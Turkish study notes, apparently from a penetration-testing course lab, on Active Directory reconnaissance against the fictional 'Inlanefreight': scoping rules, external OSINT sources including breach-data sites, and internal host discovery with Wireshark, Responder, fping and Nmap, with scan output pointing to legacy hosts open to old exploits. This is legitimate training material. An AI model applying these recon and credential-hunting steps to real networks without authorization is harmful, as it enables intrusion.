Gerçek bir saldırıyı simüle etmek için Cat-5, bu belgede sağlananlar ve dış testlerden keşfedilenler dışında hiçbir ön bilgi olmadan, güvenilmeyen bir içeriden bakış açısıyla değerlendirme yapacaktır. Test, domain kullanıcı kimlik bilgilerini elde etmek, dahili domain'i numaralandırmak, bir dayanak noktası kazanmak ve kapsam dahilindeki tüm dahili domain'leri ele geçirmek için yanal ve dikey olarak ilerlemek amacıyla dahili ağda anonim bir konumdan başlayacaktır. Test sırasında bilgisayar sistemleri ve ağ işlemleri kasıtlı olarak kesintiye uğratılmayacaktır.


### Password Testing
Inlanefreight cihazlarından yakalanan veya kuruluş tarafından sağlanan şifre dosyaları, şifre çözme için çevrimdışı iş istasyonlarına yüklenebilir ve daha fazla erişim elde etmek ve değerlendirme hedeflerine ulaşmak için kullanılabilir. Yakalanan bir şifre dosyası veya şifresi çözülen şifreler hiçbir zaman değerlendirmeye resmi olarak katılmayan kişilere açıklanmayacaktır. Tüm veriler Cat-5'in sahip olduğu ve onayladığı sistemlerde güvenli bir şekilde saklanacak ve Cat-5 ile Inlanefreight arasındaki resmi sözleşmede tanımlanan süre boyunca muhafaza edilecektir.

Bu tarz belgeleri görmeye alışmamız için yukarıdaki kapsam belirleme belgelerini sağladık. Infosec Kariyerlerimizde ilerledikçe, özellikle saldırı tarafında, bu tür bilgileri özetleyen kapsam belirleme belgeleri ve Angajman Kuralları (RoE) belgeleri almak yaygın olacaktır.

#### Sahne Hazır
Artık bu modül için kapsamımızı net bir şekilde belirlediğimize göre, Active Directory numaralandırma ve saldırı vektörlerini keşfetmeye başlayabiliriz. Şimdi, Inlanefreight'a karşı pasif harici numaralandırma gerçekleştirmeye başlayalım.



### Dış Recon ve Numaralandırma Prensipleri
Herhangi bir pentest başlatmadan önce, hedefinizin dış keşiflerini yapmak faydalı olabilir. Bu, aşağıdakiler gibi birçok farklı işleve hizmet edebilir:
* Kapsam belirleme belgesinde müşteriden size sağlanan bilgilerin doğrulanması
* Uzaktan çalışırken uygun kapsama yönelik eylemler gerçekleştirdiğinizden emin olmak
* Sızdırılmış kimlik bilgileri gibi testinizin sonucunu etkileyebilecek kamuya açık her türlü bilgiyi aramak
Şöyle düşünün; müşterilerimiz için mümkün olan en kapsamlı testi sunabilmek için arazinin yapısını öğrenmeye çalışıyoruz. Bu aynı zamanda dünyadaki olası bilgi sızıntılarını ve ihlal verilerini tespit etmek anlamına da geliyor. Bu, müşterinin ana web sitesinden veya sosyal medyasından bir kullanıcı adı formatı toplamak kadar basit olabilir. Ayrıca GitHub depolarını kod aktarımlarında bırakılan kimlik bilgileri için taramak, intranet veya uzaktan erişilebilir sitelere bağlantılar için belgelerde avlanmak ve kurumsal ortamın nasıl yapılandırıldığına dair bize anahtar olabilecek herhangi bir bilgi aramak kadar derinlere dalabiliriz.


### Ne Arıyoruz?
Dış keşiflerimizi gerçekleştirirken, aramamız gereken birkaç temel öğe vardır. Bu bilgiler her zaman kamuya açık olmayabilir, ancak dışarıda ne olduğunu görmek akıllıca olacaktır. Bir sızma testi sırasında takılırsak, pasif keşif yoluyla elde edilebileceklere bakmak, bir VPN'e veya başka bir dış hizmete erişmek için kullanılabilecek parola ihlali verileri gibi ilerlemek için gereken dürtüyü bize verebilir. Aşağıdaki tablo, görevimizin bu aşamasında arayacağımız “Ne ”yi vurgulamaktadır.
![Pasted image 20241001235652.png](/img/user/resimler/Pasted%20image%2020241001235652.png)
Dış keşiflerin neden ve niçinlerini ele aldık; şimdi de nerede ve nasıllarını inceleyelim.

### Nereye Bakıyoruz?
Yukarıdaki veri noktaları listemiz birçok farklı şekilde toplanabilir. Değerlendirmemiz için hayati önem taşıyan bilgileri elde etmek için kullanabileceğimiz yukarıdaki bilgilerin bir kısmını veya tamamını bize sağlayabilecek birçok farklı web sitesi ve araç bulunmaktadır. Aşağıdaki tabloda kullanılabilecek birkaç potansiyel kaynak ve örnek listelenmektedir.

* ASN / IP registrars : [IANA](https://www.iana.org/), Amerika'da arama yapmak için [arin](https://www.arin.net/), Avrupa'da arama yapmak için [RIPE](https://www.ripe.net/), [BGP Toolkit](https://bgp.he.net/)

* Domain Kayıt Şirketleri & DNS : [Domaintools](https://www.domaintools.com/), [PTRArchive](http://ptrarchive.com/), [ICANN](https://lookup.icann.org/lookup), söz konusu domain'e karşı manuel DNS kaydı talepleri veya 8 8 8 gibi iyi bilinen DNS sunucularına karşı manuel DNS kaydı talepleri.

* Sosyal Medya : Linkedin, Twitter, Facebook, bölgenizin başlıca sosyal medya sitelerini, haber makalelerini ve kuruluş hakkında bulabileceğiniz tüm ilgili bilgileri araştırın.

* Halka Açık Şirket Web Siteleri : Genellikle, bir şirketin kamuya açık web sitesinde ilgili bilgiler gömülü olacaktır. Haber makaleleri, gömülü belgeler ve “Hakkımızda” ve “Bize Ulaşın” sayfaları da altın madeni olabilir.

* `Cloud & Dev Storage Spaces`: [GitHub](https://github.com/), [AWS S3 buckets & Azure Blog storage containers](https://grayhatwarfare.com/), [Google searches using "Dorks"](https://www.exploit-db.com/google-hacking-database)|

* İhlal Veri Kaynakları : Herhangi bir kurumsal e-posta hesabının genel ihlal verilerinde görünüp görünmediğini belirlemek için [HaveIBeenPwned](https://haveibeenpwned.com/), çevrimdışı olarak kırmayı deneyebileceğimiz açık metin şifreleri veya karmaları olan kurumsal e-postaları aramak için [Dehashed](https://www.dehashed.com/). Daha sonra bu parolaları AD kimlik doğrulamasını kullanabilecek tüm açık oturum açma portallarında (Citrix, RDS, OWA, 0365, VPN, VMware Horizon, özel uygulamalar vb.


### Adres Alanlarını Bulma
![Pasted image 20241002020739.png](/img/user/resimler/Pasted%20image%2020241002020739.png)



#### Domain'in İlk Numaralandırılması
Inlanefreight'a karşı AD odaklı sızma testimizin en başındayız. Bazı temel bilgileri topladık ve kapsam belirleme belgeleri aracılığıyla müşteriden ne bekleyeceğimize dair bir resim elde ettik.


#### Kurulum
Testin bu ilk bölümü için, bizim için ağın içine yerleştirilmiş bir saldırı hostu üzerinde başlıyoruz. Bu, bir müşterinin iç sızma testi gerçekleştirmemiz için seçebileceği yaygın bir yoldur. Bir müşterinin test için seçebileceği kurulum türlerinin bir listesi şunları içerir:

* VPN üzerinden kontrol ettiğimiz bir jump host'u geri çağıran ve içine SSH yapabileceğimiz, kendi iç altyapılarında sanal bir makine olarak bir penetrasyon testi dağıtımı (tipik olarak Linux).
* Bir ethernet portuna takılı, VPN üzerinden bizi geri çağıran ve içine SSH yapabileceğimiz fiziksel bir cihaz.
* Dizüstü bilgisayarımızın bir ethernet portuna takılı olduğu ofislerinde fiziksel bir varlık.
* Azure veya AWS'de, genel anahtar kimlik doğrulaması ve beyaz listeye alınmış genel IP adresimizi kullanarak SSH ile bağlanabileceğimiz iç ağa erişimi olan bir Linux sanal makinesi.
* İç ağlarına VPN erişimi (biraz sınırlayıcı çünkü LLMNR/NBT-NS Poisoning gibi belirli saldırıları gerçekleştiremeyeceğiz).
* Müşterinin VPN'ine bağlı kurumsal bir dizüstü bilgisayardan.
* Yönetilen bir iş istasyonunda (genellikle Windows), fiziksel olarak ofislerinde oturarak sınırlı internet erişimi veya araçları çekme yeteneği olmadan. Bu seçeneği de seçebilirler, ancak size tam internet erişimi, yerel yönetici verebilirler ve end nokta korumasını izleme moduna geçirebilirler, böylece araçları istediğiniz zaman çekebilirsiniz.
* Citrix veya benzeri kullanılarak erişilen bir VDI (sanal masaüstü) üzerinde, yönetilen iş istasyonu için açıklanan yapılandırmalardan biri ile tipik olarak VPN üzerinden uzaktan veya kurumsal bir dizüstü bilgisayardan erişilebilir.

Bunlar gördüğüm en yaygın kurulumlar, ancak bir müşteri bunlardan birinin başka bir varyasyonuyla da gelebilir. Müşteri ayrıca bize sadece kapsam dahilindeki IP adreslerinin/CIDR ağ aralıklarının bir listesini verdikleri “gri kutu” yaklaşımını ya da çeşitli teknikler kullanarak tüm keşfi körü körüne yapmamız gereken “kara kutu” yaklaşımını seçebilir. Son olarak, kaçamaklı, kaçamaksız ya da hibrit kaçamaklı (“sessiz” başlayıp hangi eşikte tespit edildiğimizi görmek için yavaşça sesimizi yükselterek ve ardından kaçamaksız teste geçerek) yöntemlerden birini seçebilirler. Ayrıca kimlik bilgileri olmadan veya standart bir domain kullanıcısı perspektifinden başlamamızı da seçebilirler.

Müşterimiz Inlanefreight aşağıdaki yaklaşımı seçti çünkü mümkün olduğunca kapsamlı bir değerlendirme istiyorlar. Şu anda, güvenlik programları herhangi bir kaçamak test veya “ black box” yaklaşımından faydalanacak kadar olgun değildir.

* Kendi iç ağlarındaki özel bir pentest sanal makinesi bizim atlama hostumuzu geri çağırıyor ve biz de test yapmak için bu sanal makineye SSH ile bağlanabiliyoruz.
* Ayrıca bize gerekirse araçları yükleyebileceğimiz bir Windows host verdiler.
* Kimliği doğrulanmamış bir noktadan başlamamızı istediler ancak Windows saldırı hostuna erişmek için kullanılabilecek standart bir domain kullanıcı hesabı (htb-student) da verdiler.
* “ Grey box” testi. Bize 172.16.5.0/23 ağ aralığını verdiler ve ağ hakkında başka hiçbir bilgi vermediler.
* Non-evasive testing.

Bize kimlik bilgileri ya da ayrıntılı bir iç ağ haritası verilmedi.


### Tasks
Bu bölüm için gerçekleştirmemiz gereken görevler şunlardır:
* Hostları, kritik hizmetleri ve bir yer edinmek için potansiyel yolları belirleyerek dahili ağı numaralandırın.
* Bu, erişimimizi ilerletmek için yararlanabileceğimiz kullanıcıları, hostları ve güvenlik açıklarını belirlemek için aktif ve pasif önlemleri içerebilir.
* Karşılaştığımız tüm bulguları daha sonra kullanmak üzere belgeleyin. Son derece önemli!

Domain kullanıcı bilgileri olmadan Linux saldırı hostumuzdan başlayacağız. Bir pentesti bu şekilde başlatmak yaygın bir durumdur. Birçok kuruluş, test için size daha fazla bilgi vermeden önce bunun gibi kör bir perspektiften neler yapabileceğinizi görmek isteyecektir. Bu, bir saldırganın domain'e sızmak için hangi potansiyel yolları kullanması gerektiğine dair daha gerçekçi bir bakış açısı sağlar. Bir saldırganın internet üzerinden yetkisiz erişim sağlaması (örn. kimlik avı saldırısı), binaya fiziksel erişim sağlaması, dışarıdan kablosuz erişim sağlaması (kablosuz ağ AD ortamına dokunuyorsa) ve hatta sahte bir çalışan olması durumunda neler yapabileceğini görmelerine yardımcı olabilir. Bu aşamanın başarısına bağlı olarak müşteri, testi hızlandırmak ve mümkün olduğunca fazla alanı kapsamamıza olanak sağlamak için bize domain bağlantılı bir host'a veya ağ için bir dizi kimlik bilgisine erişim sağlayabilir.

Aşağıda, şu anda aramamız ve tercih ettiğimiz not alma aracına not etmemiz ve mümkün olduğunda tarama/araç çıktısını dosyalara kaydetmemiz gereken bazı önemli veri noktaları yer almaktadır.


### Kilit Veri Noktaları
![Pasted image 20241002141822.png](/img/user/resimler/Pasted%20image%2020241002141822.png)


## TTPs
Bir AD ortamını numaralandırmak, plansız bir şekilde yaklaşıldığında çok zor olabilir. AD'de depolanan çok sayıda veri vardır ve aşamalı olarak incelenmezse elemek uzun zaman alabilir ve muhtemelen bazı şeyleri gözden kaçırırız. Kendimiz için bir oyun planı belirlemeli ve parça parça ele almalıyız. Herkes biraz farklı şekillerde çalışır, bu nedenle daha fazla deneyim kazandıkça, bizim için en iyi şekilde çalışan kendi tekrarlanabilir metodolojimizi geliştirmeye başlayacağız. Nasıl ilerlediğimizden bağımsız olarak, genellikle aynı yerden başlarız ve aynı veri noktalarını ararız. Bu bölümde ve sonraki bölümlerde birçok araç deneyeceğiz. Her örneği yeniden üretmek ve hatta nasıl farklı çalıştıklarını görmek, sözdizimlerini öğrenmek ve bizim için en iyi yaklaşımın hangisi olduğunu bulmak için farklı araçlarla örnekleri yeniden oluşturmaya çalışmak önemlidir.

Ağdaki tüm hostların pasif olarak tanımlanmasıyla başlayacağız, ardından her host hakkında daha fazla bilgi edinmek için sonuçları aktif olarak doğrulayacağız (hangi hizmetlerin çalıştığı, isimler, potansiyel güvenlik açıkları, vb.) Hangi hostların var olduğunu öğrendikten sonra, bu hostları araştırmaya devam edebilir ve onlardan toplayabileceğimiz ilginç verileri arayabiliriz. Bu görevleri tamamladıktan sonra durup yeniden gruplanmalı ve elimizdeki bilgilere bakmalıyız. Şu anda, domain'e bağlı bir host'ta yer edinmek için hedefleyebileceğimiz bir dizi kimlik bilgisine ya da kullanıcı hesabına sahip olacağımızı ya da Linux saldırı host'umuzdan kimlik bilgileriyle numaralandırmaya başlayabileceğimizi umuyoruz.

Bu numaralandırmada bize yardımcı olacak birkaç araç ve tekniğe göz atalım. 



### Identifying Hosts
İlk olarak, ağı dinlemek ve neler olup bittiğini görmek için biraz zaman ayıralım. Wireshark ve TCPDump'ı kullanarak “kulağımızı kabloya dayayabilir” ve hangi hostları ve ağ trafiği türlerini yakalayabileceğimizi görebiliriz. Bu, özellikle değerlendirme yaklaşımı “black box” ise faydalıdır. Bazı [ARP](https://en.wikipedia.org/wiki/Address_Resolution_Protocol) istekleri ve yanıtları, [MDNS](https://en.wikipedia.org/wiki/Multicast_DNS) ve diğer temel [ikinci katman paketlerini](https://www.juniper.net/documentation/us/en/software/junos/multicast-l2/topics/topic-map/layer-2-understanding.html) (“switched” bir ağda olduğumuzdan, mevcut yayın alanıyla sınırlıyız) fark ediyoruz, bunlardan bazılarını aşağıda görebilirsiniz. Bu bize müşterinin ağ kurulumu hakkında birkaç bilgi veren harika bir başlangıç.

En alta gidin, hedefi oluşturun, xfreerdp kullanarak Linux saldırı hostuna bağlanın ve trafiği yakalamaya başlamak için Wireshark'ı çalıştırın.

#### Start Wireshark on ea-attack01

![Pasted image 20241002144230.png](/img/user/resimler/Pasted%20image%2020241002144230.png)

![Pasted image 20241002143502.png](/img/user/resimler/Pasted%20image%2020241002143502.png)
* `sudo -E` komutundaki `-E` seçeneği, mevcut kullanıcı ortam değişkenlerini (environment variables) **sudo** ile çalıştırılan komuta aktarmaya yarar.

* Örneğin, normalde `sudo` kullanıldığında, komutu çalıştıran kullanıcının ortam değişkenleri sıfırlanabilir veya yalnızca bir alt kümesi korunabilir. Ancak `-E` seçeneği kullanıldığında, mevcut tüm ortam değişkenleri korunur ve komuta aktarılır. Bu, özellikle özel ortam değişkenlerine ihtiyaç duyan uygulamaları çalıştırırken önemlidir.

* `sudo -E wireshark` komutu, Wireshark'ı yükseltilmiş ayrıcalıklarla çalıştırırken, aynı zamanda mevcut ortam değişkenlerini de koruyarak çalıştırır.


### ifconfig 

![Pasted image 20241002144528.png](/img/user/resimler/Pasted%20image%2020241002144528.png)

Hedefimiz ens224 ağı 


#### Wireshark Output
![Pasted image 20241002144706.png](/img/user/resimler/Pasted%20image%2020241002144706.png)

ARP paketleri bizi hostlardan haberdar eder: 172.16.5.5, 172.16.5.25 172.16.5.50, 172.16.5.100 ve 172.16.5.125.

![Pasted image 20241002144743.png](/img/user/resimler/Pasted%20image%2020241002144743.png)

MDNS, ACADEMY-EA-WEB01 hostundan haberdar olmamızı sağlar.

Not : Ben wireshark'ı incelediğimde nbns protokolünde gördüm . 

**NBNS (NetBIOS Name Service)** ve **mDNS (Multicast DNS)**, ağ üzerindeki cihazlar arasında isim çözümlemeyi sağlayan iki farklı protokoldür. İşlevleri benzer olsa da, farklı yöntemler ve kullanım alanları ile çalışırlar.

### NBNS (NetBIOS Name Service) nedir?

- **NBNS**, NetBIOS (Network Basic Input/Output System) üzerinden çalışan bir isim çözümleme protokolüdür. Bir IP adresini NetBIOS ismine (cihaz adlarına) dönüştürmek için kullanılır.
- **Windows** tabanlı ağlarda yaygın olarak kullanılmıştır, özellikle eski ağ sistemlerinde önemli bir rol oynamıştır.
- NBNS, UDP 137 numaralı port üzerinden çalışır ve cihazların kendi adlarını duyurmasına ve ağ üzerindeki diğer cihazların isim çözümlemelerine olanak tanır.
- Örneğin, bir bilgisayarın adını (hostname) bilip IP adresini öğrenmek istiyorsanız, NBNS ile bu isim çözümlemesini gerçekleştirebilirsiniz.

### mDNS (Multicast DNS) nedir?

- **mDNS**, ağ üzerindeki cihazların birbirini bulmasına ve isim çözümlemesine olanak tanıyan bir protokoldür. Özellikle **yerel ağlar** (local network) için tasarlanmıştır.
- **Multicast DNS**, klasik DNS sistemine benzer ancak merkezi bir DNS sunucusuna gerek kalmadan çalışır. Cihazlar, yerel ağ üzerinde multicast kullanarak DNS sorguları gönderir ve bu sorgulara cevap alarak isim çözümlemesini gerçekleştirir.
- mDNS, **Apple Bonjour** ve **Avahi** gibi servisler tarafından kullanılır ve genellikle yerel ağda servis keşfi (service discovery) yapmak için kullanılır.
- mDNS, UDP 5353 numaralı port üzerinden çalışır.
- Özellikle ev ağları ve küçük iş ağlarında yaygın olarak kullanılır, çünkü cihazların birbirini otomatik olarak bulmasını sağlar.

### Farklılıklar:

- **NBNS**, genellikle NetBIOS tabanlı sistemler için kullanılırken, **mDNS** daha modern ağlarda, özellikle yerel ağlarda cihaz keşfi ve isim çözümleme amacıyla kullanılır.
- **NBNS**, NetBIOS protokolüne dayanırken, **mDNS** klasik DNS'in multicast versiyonudur ve daha geniş bir uygulama alanına sahiptir.
- **NBNS** daha çok eski Windows ağlarında kullanılırken, **mDNS** hem macOS, hem Linux, hem de modern ağlarda daha sık tercih edilir.

Bu iki protokol, ağdaki cihazlar arasında isim çözümleme ve iletişim sağlama konusunda önemli rol oynar.

GUI'si olmayan bir host üzerindeysek (ki bu tipiktir), aynı işlevleri yerine getirmek için [tcpdump](https://linux.die.net/man/8/tcpdump), [net-creds ](https://github.com/DanMcInerney/net-creds)ve [NetMiner](https://www.netminer.com/en/product/netminer.php) vb. kullanabiliriz. Ayrıca tcpdump'ı bir .pcap dosyasına yakalama kaydetmek, başka bir host'a aktarmak ve Wireshark'ta açmak için de kullanabiliriz.


#### Tcpdump Output
![Pasted image 20241002145333.png](/img/user/resimler/Pasted%20image%2020241002145333.png)
![Pasted image 20241002145430.png](/img/user/resimler/Pasted%20image%2020241002145430.png)
Ağ trafiğini dinlemek ve yakalamak için tek bir doğru yol yoktur. Ağ verilerini işleyebilen çok sayıda araç vardır. Wireshark ve tcpdump, kullanımı en kolay ve en yaygın bilinenlerden sadece birkaçıdır. Bulunduğunuz host'a bağlı olarak, Windows 10'un tüm sürümlerine eklenen ==pktmon.exe== gibi yerleşik bir ağ izleme aracına zaten sahip olabilirsiniz. Test için bir not olarak, yakaladığınız PCAP trafiğini kaydetmek her zaman iyi bir fikirdir. Daha sonra daha fazla ipucu aramak için tekrar gözden geçirebilirsiniz ve raporlarınızı yazarken dahil etmek için harika ek bilgiler sağlar.

Ağ trafiğine ilk bakışımız bizi ==MDNS== ve ==ARP== aracılığıyla birkaç host'a yönlendirdi. Şimdi ağ trafiğini analiz etmek ve domain'de başka bir şeyin ortaya çıkıp çıkmadığını belirlemek için ==Responder== adlı bir araç kullanalım.

[Responder](https://github.com/lgandx/Responder-Windows), LLMNR, NBT-NS ve MDNS istek ve yanıtlarını dinlemek, analiz etmek ve zehirlemek için oluşturulmuş bir araçtır. Daha birçok işlevi vardır, ancak şimdilik tek kullanacağımız araç Analyze modundadır. Bu, ağı pasif olarak dinleyecek ve herhangi bir zehirli paket göndermeyecektir. Bu aracı ilerleyen bölümlerde daha derinlemesine ele alacağız.


#### Starting Responder
![Pasted image 20241002151413.png](/img/user/resimler/Pasted%20image%2020241002151413.png)

Responder'ı pasif analiz modu etkinken başlattığımızda, oturumumuzda istek akışını göreceğiz. Aşağıda, Wireshark yakalamalarımızda daha önce bahsedilmeyen birkaç benzersiz host bulduğumuza dikkat edin. IP'ler ve DNS host adlarından oluşan güzel bir hedef listesi oluşturmaya başladığımız için bunları not etmeye değer.

Pasif kontrollerimiz bize daha derinlemesine bir numaralandırma için not almamız gereken birkaç host verdi. Şimdi fping kullanarak alt ağın hızlı bir ICMP taraması ile başlayarak bazı aktif kontroller yapalım.

[Fping](https://fping.org/), bir host'a ulaşmak ve etkileşimde bulunmak için ICMP isteklerini ve yanıtlarını kullanarak bize standart ping uygulamasına benzer bir yetenek sağlar. Fping'in parladığı nokta, aynı anda birden fazla hostun bulunduğu bir listeye karşı ICMP paketleri yayınlama yeteneği ve komut dosyası yazılabilirliğidir. Ayrıca, devam etmeden önce tek bir host'a yapılan birden fazla isteğin geri dönmesini beklemek yerine döngüsel bir şekilde host'ları sorgulayarak round-robin tarzında çalışır. Bu kontroller, iç ağda başka bir şeyin aktif olup olmadığını belirlememize yardımcı olacaktır. ICMP tek durak noktası değildir, ancak neyin var olduğuna dair bir ilk fikir edinmenin kolay bir yoludur. Diğer açık portlar ve aktif protokoller daha sonra hedeflenecek yeni hostlara işaret edebilir. Şimdi bunu iş başında görelim.

### FPing Active Checks
Burada fping'e birkaç bayrakla başlayacağız: canlı olan hedefleri göstermek için a, taramanın sonunda istatistikleri yazdırmak için s, CIDR ağından bir hedef listesi oluşturmak için g ve hedef başına sonuçları göstermemek için q.
![Pasted image 20241002153203.png](/img/user/resimler/Pasted%20image%2020241002153203.png)
![Pasted image 20241002153313.png](/img/user/resimler/Pasted%20image%2020241002153313.png)
Benim çıktı. 

Yukarıdaki komut /23 ağında hangi hostların aktif olduğunu doğrular ve bunu hedef listesindeki her IP için terminali sonuçlarla spamlamak yerine sessizce yapar. Başarılı sonuçları ve pasif kontrollerimizden topladığımız bilgileri Nmap ile daha ayrıntılı bir tarama için bir listede birleştirebiliriz. fping komutundan, saldırı hostumuz da dahil olmak üzere 9 “canlı host” görebiliriz.

Not: Hedef ağdaki tarama sonuçları, laboratuvar ağının boyutu nedeniyle bu bölümdeki komut çıktısından farklı olacaktır. Yine de bu araçların nasıl çalıştığını pratik etmek ve bu laboratuvarda canlı olan her hostu not etmek için her örneği yeniden üretmeye değer.


### Nmap Scanning
Artık ağımızdaki aktif hostların bir listesine sahip olduğumuza göre, bu hostları daha fazla numaralandırabiliriz. Her bir hostun hangi hizmetleri çalıştırdığını belirlemek, Domain Controllers ve web sunucuları gibi kritik hostları tespit etmek ve daha sonra araştırmak üzere potansiyel olarak savunmasız hostları belirlemek istiyoruz. AD'ye odaklandığımızda, geniş bir tarama yaptıktan sonra, DNS, SMB, LDAP ve Kerberos gibi tipik olarak AD hizmetlerine eşlik eden standart protokollere odaklanmamız akıllıca olacaktır. Aşağıda basit bir Nmap taramasının hızlı bir örneği yer almaktadır.
![Pasted image 20241002154412.png](/img/user/resimler/Pasted%20image%2020241002154412.png)
[A (Agresif tarama seçenekleri)](https://nmap.org/book/man-misc-options.html) taraması çeşitli fonksiyonları yerine getirecektir. En önemlilerinden biri, web hizmetleri, domain hizmetleri vb. dahil olmak üzere iyi bilinen portların hızlı bir şekilde numaralandırılmasıdır. hosts.txt dosyamız için, Responder ve fping'den elde ettiğimiz sonuçların bazıları çakıştı (adı ve IP adresini bulduk), bu nedenle basit tutmak için, tarama için hosts.txt'ye yalnızca IP adresi girildi.


#### NMAP Result Highlights
```shell-session
Nmap scan report for inlanefreight.local (172.16.5.5)
Host is up (0.069s latency).
Not shown: 987 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-04-04 15:12:06Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
|_ssl-date: 2022-04-04T15:12:53+00:00; -1s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
| Issuer: commonName=INLANEFREIGHT-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-03-30T22:40:24
| Not valid after:  2023-03-30T22:40:24
| MD5:   3a09 d87a 9ccb 5498 2533 e339 ebe3 443f
|_SHA-1: 9731 d8ec b219 4301 c231 793e f913 6868 d39f 7920
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
<SNIP>  
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: ACADEMY-EA-DC01
|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
|   DNS_Computer_Name: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
|   DNS_Tree_Name: INLANEFREIGHT.LOCAL
|   Product_Version: 10.0.17763
|_  System_Time: 2022-04-04T15:12:45+00:00
<SNIP>
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: ACADEMY-EA-DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Taramalarımız bize NetBIOS ve DNS tarafından kullanılan adlandırma standardını sağladı, bazı hostların RDP'sinin açık olduğunu görebiliyoruz ve bizi INLANEFREIGHT.LOCAL domain'i (ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL) için primer Domain Controller'a yönlendirdiler. Aşağıdaki sonuçlar, muhtemelen eski bir host ile ilgili bazı ilginç sonuçları göstermektedir (mevcut laboratuvarımızda değil).

```shell-session
M1R4CKCK@htb[/htb]$ nmap -A 172.16.5.100

Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-08 13:42 EDT
Nmap scan report for 172.16.5.100
Host is up (0.071s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 7.5
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  https?
445/tcp   open  microsoft-ds Windows Server 2008 R2 Standard 7600 microsoft-ds
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2008 R2 10.50.1600.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2022-04-08T17:38:25
|_Not valid after:  2052-04-08T17:38:25
|_ssl-date: 2022-04-08T17:43:53+00:00; 0s from scanner time.
| ms-sql-ntlm-info: 
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: ACADEMY-EA-CTX1
|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
|   DNS_Computer_Name: ACADEMY-EA-CTX1.INLANEFREIGHT.LOCAL
|_  Product_Version: 6.1.7600
Host script results:
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| ms-sql-info: 
|   172.16.5.100:1433: 
|     Version: 
|       name: Microsoft SQL Server 2008 R2 RTM
|       number: 10.50.1600.00
|       Product: Microsoft SQL Server 2008 R2
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_nbstat: NetBIOS name: ACADEMY-EA-CTX1, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:c7:1c (VMware)
| smb-os-discovery: 
|   OS: Windows Server 2008 R2 Standard 7600 (Windows Server 2008 R2 Standard 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::-
|   Computer name: ACADEMY-EA-CTX1
|   NetBIOS computer name: ACADEMY-EA-CTX1\x00
|   Domain name: INLANEFREIGHT.LOCAL
|   Forest name: INLANEFREIGHT.LOCAL
|   FQDN: ACADEMY-EA-CTX1.INLANEFREIGHT.LOCAL
|_  System time: 2022-04-08T10:43:48-07:00

<SNIP>
```

Yukarıdaki çıktıdan, eski bir işletim sistemi (çıktıya göre Windows 7, 8 veya Server 2008) çalıştıran potansiyel bir host'umuz olduğunu görebiliriz. Bu, bu AD ortamında çalışan eski işletim sistemleri olduğu anlamına geldiğinden bizim için ilgi çekicidir. Ayrıca EternalBlue, MS08-067 ve diğerleri gibi eski istismarların çalışma ve bize SYSTEM düzeyinde bir shell sağlama potansiyeli olduğu anlamına gelir. Eski yazılımları ya da ömrünü tamamlamış işletim sistemlerini çalıştıran hostlara sahip olmak kulağa ne kadar garip gelse de, büyük kurumsal ortamlarda hala yaygındır. Genellikle üretim hattı veya HVAC gibi eski işletim sistemi üzerine inşa edilmiş ve uzun süredir yerinde olan bazı işlemlere veya ekipmanlara sahip olursunuz. Bu gibi ekipmanları çevrimdışı hale getirmek maliyetlidir ve bir kuruluşa zarar verebilir, bu nedenle eski hostlar genellikle yerinde bırakılır. Muhtemelen bu sistemlerin etrafına Güvenlik Duvarları, IDS/IPS ve diğer izleme ve koruma çözümlerinden oluşan sert bir dış kabuk inşa etmeye çalışacaklardır. Eğer bir tanesine girmenin yolunu bulabilirseniz, bu büyük bir olaydır ve hızlı ve kolay bir dayanak noktası olabilir. Ancak eski sistemlerden yararlanmadan önce müşterimizi uyarmalı ve bir saldırının sistem kararsızlığına yol açması ya da bir hizmeti veya hostu çökertmesi ihtimaline karşı yazılı olarak onaylarını almalıyız. Sistemi aktif olarak istismar etmeden sadece gözlemlememizi, raporlamamızı ve yolumuza devam etmemizi tercih edebilirler.

